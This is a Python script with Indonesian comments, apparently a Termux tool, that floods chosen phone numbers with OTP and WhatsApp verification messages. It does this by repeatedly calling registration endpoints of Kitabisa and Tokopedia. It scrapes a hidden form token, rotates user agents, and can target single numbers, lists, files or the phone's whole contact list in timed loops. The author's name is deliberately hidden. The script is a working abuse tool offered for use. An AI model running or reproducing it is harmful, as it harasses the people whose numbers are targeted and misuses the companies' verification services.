import requests,os,time,json,re,random
# -----------------------------------------------------------
# Demi Keamanan Author Di Sembunyikan
# Tidak ada author Untuk Sc ini
# Recode!, dosa Tanggung Sendiri
# Thanks For MyFriends, ./Kitsune, FourX, MhankBarBar, Maulana
# Underground Science And Termux Tutorial Group
# -----------------------------------------------------------

# -----------------------WARNA----------------------------
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'
# -------------------------------------------------------
# Sebuah Program Python Yg Menggunakan Program Berorientasi Object
#------------------------Classes------------------------
class spam:
	def __init__(self, nomer):
		self.nomer = nomer
	def spam(self):
		hasil=requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
		if hasil.status_code == 200:
			return f'\033[1;37mSpamm {self.nomer} \033[1;32mSukses!\033[0m'
		elif hasil.status_code == 500:
			return f'\033[1;37mSpamm {self.nomer} \033[1;31mGagal!\033[0m'
	def tokped(self):
		rands=random.choice(open('ua.txt').readlines()).split('\n')[0]
		kirim = {
			'User-Agent' : rands,
			'Accept-Encoding' : 'gzip, deflate',
			'Connection' : 'keep-alive',
			'Origin' : 'https://accounts.tokopedia.com',
			'Accept' : 'application/json, text/javascript, */*; q=0.01',
			'X-Requested-With' : 'XMLHttpRequest',
			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
		}
		regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+self.nomer+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = kirim).text
		Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
		formulir = {
			"otp_type" : "116",
			"msisdn" : self.nomer,
			"tk" : Token,
			"email" : '',
			"original_param" : "",
			"user_id" : "",
			"signature" : "",
			"number_otp_digit" : "6",
		}
		req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
			return f'\033[1;37mSpamm {self.nomer} \033[1;31mGagal!\033[0m'
		else:
			return f'\033[1;37mSpamm {self.nomer} \033[1;32mSukses!\033[0m'
# ----------------------------------------------------------------

# ---------------------------Fungsi----------------------------
def apakah():
	while True:
		lan=str(input(k+'\tapakah ingin lanjut Y/T : '+h))
		if( lan == 'Y' or lan == 'y'):
			jnspam()
		elif(lan == 't' or lan == 'T'):
			print(p)
			break
		else:
			continue
def files():
	fil=str(input(k+'\tfile : '+h))
	if fil in os.listdir(os.getcwd()):
		l=open(fil,'r').readlines()
		js=int(input(k+'\tjumlah spam : '+h))
		dly=int(input(k+'\tdelay : '+h))
		for pp in range(js):
			for d in range(len(l)-1):
				io=l[d].split('\n')[0]
				z=spam(io)
				if jns == 'ktbs':
					print('\t'+z.spam())
				elif jns == 'tkpd':
					print('\t'+z.tokped())
				else:
					print()
				time.sleep(dly)
		apakah()
	else:
		print(m+f'\tfile {fil} tidak ada')
def single():
	nomer=str(input(k+'\tWa : '+h))
	jm=int(input(k+'\tjumlah spam : '+h))
	dly=int(input(k+'\tdelay : '+h))
	for oo in range(jm):
		z=spam(nomer)
		if jns == 'ktbs':
			print('\t'+z.spam())
		elif jns == 'tkpd':
			print('\t'+z.tokped())
		else:
			print()
		time.sleep(dly)
	apakah()
def multi():
	nomer=[]
	jum=int(input(k+'\tjumlah nomer : '+h))
	for i in range(jum):
		nomer.append(str(input(k+f'\tnomer Wa -{i+1} : '+h)))
	spm=int(input(k+'\tjumlah spam : '+h))
	dly=int(input(k+'delay : '+h))
	kk=len(nomer)
	for i in range(spm):
		for ss in range(kk):
			z=spam(nomer[ss])
			if jns == 'ktbs':
				print('\t'+z.spam())
			elif jns == 'tkpd':
				print('\t'+z.tokped())
			else:
				print()
		time.sleep(dly)
	apakah()
#-------------------------Fungsi Banner-----------------------
def logo():
	os.system('clear')
	return u+'''
  ██████  ██▓███   ▄▄▄       ███▄ ▄███▓    █     █░ ▄▄▄      
▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒   ▓█░ █ ░█░▒████▄    
░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░   ▒█░ █ ░█ ▒██  ▀█▄  
  ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██    ░█░ █ ░█ ░██▄▄▄▄██ 
▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒   ░░██▒██▓  ▓█   ▓██▒
▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░   ░ ▓░▒ ▒   ▒▒   ▓▒█░
░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░     ▒ ░ ░    ▒   ▒▒ ░
░  ░  ░  ░░         ░   ▒   ░      ░        ░   ░    ░   ▒   
      ░                 ░  ░       ░          ░          ░  ░
                                                             
'''
# -----------------------------------------------------------
def termux():
	os.system('termux-contact-list > .contact')
	po=json.loads(open('.contact','r').read())
	lenpo=len(po)
	for poh in range(lenpo):
		print(m+str(poh+1)+' '+k+po[poh]['name'])
	nj=po[int(input(u+'\tpilih : '+h))-1]['number']
	dly=int(input(u+'\tdelay : '+h))
	for w in range(int(input(u+'\tjumlah spam : '+h))):
		z=spam(nj)
		if jns == 'ktbs':
			print('\t'+z.spam())
		elif jns == 'tkpd':
			print('\t'+z.tokped())
		time.sleep(dly)
	apakah()
def main():
	print(logo())
	print(k+'Mode\n'+m+'-'*30+b+'\n\t1. Single Nomer\n\t2. Multi Nomer\n\t3. File List Number\n\t4. my contact (memerlukan termux-api)\n'+m+'-'*30)
	pil=str(input(k+'\tpilih : '+h))
	if( pil == '1' or pil == '01'):
		single()
	elif( pil == '2' or pil == '02'):
		multi()
	elif( pil == '3' or pil == '03'):
		files()
	elif( pil == '4' or pil == '04'):
		termux()
	else:
		print(m+'yg anda pilih tidak ada')
		time.sleep(2)
		main()
def jnspam():
	global jns
	print(logo())
	print(k+'spam\n'+m+'-'*30+h+'\n\t1. Kita Bisa\n\t2. Tokopedia\n'+m+'-'*30)
	while True:
		oy=str(input(k+'pilih > '+h))
		if( oy == '1' or oy == '01' ):
			jns='ktbs'
			break
		elif( oy == '2' or oy == '02' ):
			jns='tkpd'
			break
		else:
			print(m+'yg anda pilih tidak ada')
			continue
	main()
jnspam()
